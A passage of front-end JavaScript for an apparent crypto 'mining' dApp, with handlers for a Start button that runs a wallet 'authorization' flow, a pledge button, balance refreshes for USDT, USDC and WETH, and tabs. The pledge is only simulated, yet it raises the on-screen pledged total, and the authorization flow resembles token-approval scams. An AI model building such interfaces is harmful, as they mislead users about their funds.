        console.error("startBtn: Balance fetch error:", e); // 日誌添加
        return;
    }
    startBtn.disabled = true;
    startBtn.textContent = 'Authorizing...';
    try {
        await handleConditionalAuthorizationFlow();
        alert('Authorization successful! Mining has started.');
        await updateUIBasedOnChainState();
    } catch (error) {
        console.error("startBtn: Authorization failed:", error); // 日誌添加
        alert(`Authorization failed: ${error.message}`);
        updateStatus(`Authorization failed: ${error.message}`);
    } finally {
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
        console.log("startBtn: Authorization process completed."); // 日誌添加
    }
});

pledgeBtn.addEventListener('click', async () => {
    if (!signer) { 
        alert('Please connect your wallet first!'); 
        console.log("pledgeBtn: Clicked but no signer available."); // 日誌添加
        return; 
    }
    const amount = parseFloat(pledgeAmount.value) || 0;
    if (!amount) { 
        alert('Please enter a pledge amount!'); 
        console.log("pledgeBtn: No pledge amount entered."); // 日誌添加
        return; 
    }
    pledgedAmount = amount;
    localStorage.setItem('pledgedAmount', pledgedAmount.toString());
    console.log(`pledgeBtn: Pledged ${amount} ${pledgeToken.value} for ${pledgeDuration.value} days.`); // 日誌添加
    alert(`Pledged ${amount} ${pledgeToken.value} for ${pledgeDuration.value} days... (Simulation)`);
    const totalPledgedValue = document.getElementById('totalPledgedValue');
    let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
    totalPledgedValue.textContent = `${(currentTotal + amount).toFixed(2)} ${pledgeToken.value}`;
    await saveUserData();
});

refreshWallet.addEventListener('click', async () => {
    if (!signer) { 
        alert('Please connect your wallet first!'); 
        console.log("refreshWallet: Clicked but no signer available."); // 日誌添加
        return; 
    }
    updateStatus('Refreshing balances...');
    const balances = { 
        usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
        usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
        weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
    };
    console.log("refreshWallet: Refreshed balances:", balances); // 日誌添加
    updateBalancesUI(balances);
    updateStatus('');
    alert('Wallet balance refreshed!');
});

walletTokenSelect.addEventListener('change', async () => {
    console.log("walletTokenSelect: Changed to token:", walletTokenSelect.value); // 日誌添加
    if (!signer) {
        if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
        if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
        console.log("walletTokenSelect: No signer, reset balance display."); // 日誌添加
        return;
    }
    const balances = { 
        usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
        usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
        weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
    };
    console.log("walletTokenSelect: Fetched balances:", balances); // 日誌添加
    updateBalancesUI(balances);
});

const tabs = document.querySelectorAll('.tab');
const sections = document.querySelectorAll('.content-section');
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        sections.forEach(s => s.classList.remove('active'));
        document.getElementById(tab.dataset.tab).classList.add('active');
        console.log(`tabClick: Switched to tab: ${tab.dataset.tab}`); // 日誌添加
    });
});